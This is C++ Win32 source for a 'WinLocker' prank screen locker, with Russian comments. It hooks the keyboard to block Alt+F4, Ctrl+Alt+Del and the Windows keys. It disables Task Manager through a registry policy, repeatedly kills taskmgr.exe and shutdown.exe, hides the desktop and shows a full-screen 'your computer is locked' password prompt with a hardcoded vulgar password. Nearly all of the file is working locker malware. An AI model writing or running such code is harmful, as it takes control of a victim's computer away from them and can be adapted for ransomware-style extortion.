#define UNICODE 
#define _UNICODE 

#include <windows.h>
#include <winuser.h>
#include <commctrl.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include <shlobj.h>
#include <tchar.h>

// Подключение библиотек
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "advapi32.lib") // <- Фикс: Обязательно для работы с реестром

// Загаданное слово
const std::wstring SECRET_WORD = L"ПЕНИС";

// Глобальные переменные
HWND hMainWnd = NULL;
bool locked = true;
HWND hWordleWnd = NULL;
std::wstring currentGuess;

// Low-level keyboard hook
HHOOK hKeyboardHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbStruct->vkCode;

        // Блок Alt+F4
        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        // Блок Ctrl+Alt+Del (частично, система может перехватить раньше)
        if (vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        // Блок Win+Tab и Win-клавиш
        if ((vkCode == VK_LWIN || vkCode == VK_RWIN)) {
            return 1;
        }
        // Экстренно: Shift+0 (Panic Key)
        if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            locked = false;
            PostQuitMessage(0);
            return 1;
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Установка хука
void InstallHook() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
}

// Удаление хука
void UninstallHook() {
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
}

// Убить процесс по имени
void KillProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
}

// Блок Task Manager через реестр
void BlockTaskManager() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    KillProcessByName(L"taskmgr.exe");
}

// Разблок Task Manager
void UnblockTaskManager() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
}

// Мониторинг shutdown (чтобы не выключили)
void MonitorShutdown() {
    while (locked) {
        KillProcessByName(L"shutdown.exe");
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Скрыть рабочий стол
void HideDesktop() {
    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");
    if (hProgman) ShowWindow(hProgman, SW_HIDE);
}

// Показать рабочий стол
void ShowDesktop() {
    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");
    if (hProgman) ShowWindow(hProgman, SW_SHOW);
}

void StartWordle(HWND parent) {
    if (hWordleWnd) return;
    hWordleWnd = CreateWindowExW(0, L"STATIC", L"Wordle Prank", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, parent, NULL, GetModuleHandle(NULL), NULL);
    ShowWindow(hWordleWnd, SW_SHOWMAXIMIZED);
    SetWindowPos(hWordleWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

    CreateWindowExW(0, L"STATIC", L"Тут должна быть логика Wordle...", WS_VISIBLE | WS_CHILD,
        100, 50, 300, 30, hWordleWnd, NULL, GetModuleHandle(NULL), NULL);
}

// Проверка пароля
void CheckPassword(HWND hEdit) {
    wchar_t buffer[256];
    GetWindowTextW(hEdit, buffer, 256);
    std::wstring pass(buffer);
    
    // Приводим к нижнему регистру для сравнения (простая реализация)
    for (auto &c : pass) c = towupper(c);

    if (pass == SECRET_WORD) {
        locked = false;
        UnblockTaskManager();
        ShowDesktop();
        PostQuitMessage(0);
    } else {
        MessageBoxW(NULL, L"Неверный пароль!", L"Ошибка", MB_OK | MB_ICONERROR);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE: {
        CreateWindowExW(0, L"STATIC", L"ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН!\nДля разблокировки введите пароль:", WS_VISIBLE | WS_CHILD,
            100, 100, 400, 100, hWnd, NULL, GetModuleHandle(NULL), NULL);
        
        HWND hEdit = CreateWindowExW(0, L"EDIT", L"", WS_VISIBLE | WS_BORDER | ES_PASSWORD,
            100, 200, 300, 30, hWnd, (HMENU)1, GetModuleHandle(NULL), NULL);
        
        CreateWindowExW(0, L"BUTTON", L"Сыграть в Wordle", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
            100, 250, 300, 30, hWnd, (HMENU)2, GetModuleHandle(NULL), NULL);
        
        CreateWindowExW(0, L"BUTTON", L"Разблокировать", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
            100, 300, 150, 30, hWnd, (HMENU)3, GetModuleHandle(NULL), NULL);
        
        SetFocus(hEdit);
        break;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == 2) StartWordle(hWnd);
        if (LOWORD(wParam) == 3) CheckPassword(GetDlgItem(hWnd, 1));
        break;
    }
    case WM_KEYDOWN:
        if (wParam == VK_RETURN) CheckPassword(GetDlgItem(hWnd, 1));
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// ГЛАВНЫЙ ФИКС: Используем wWinMain вместо WinMain
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    // Установка хука, блокировок
    InstallHook();
    BlockTaskManager();
    HideDesktop();
    std::thread shutdownMonitor(MonitorShutdown);

    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"WinLockerClass";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);

    hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"WinLockerClass", L"Заблокировано",
        WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);
    ShowWindow(hMainWnd, SW_MAXIMIZE);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && locked) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UninstallHook();
    UnblockTaskManager();
    ShowDesktop();
    shutdownMonitor.detach();
    return 0;
}
